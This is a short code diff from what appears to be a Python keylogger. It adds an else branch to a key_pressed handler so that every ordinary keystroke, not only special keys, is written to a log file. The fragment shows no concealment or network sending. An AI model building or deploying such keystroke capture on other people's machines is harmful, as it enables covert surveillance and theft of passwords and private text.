@@ -34,6 +34,8 @@ def key_pressed(event):
             file.write("[" + key.upper() + "] ")
         elif key == "Control_R":
             file.write("[" + key.upper() + "] ")
+        else:
+            file.write(key + " ")
         
     print(f"Key pressed: {key}")
     
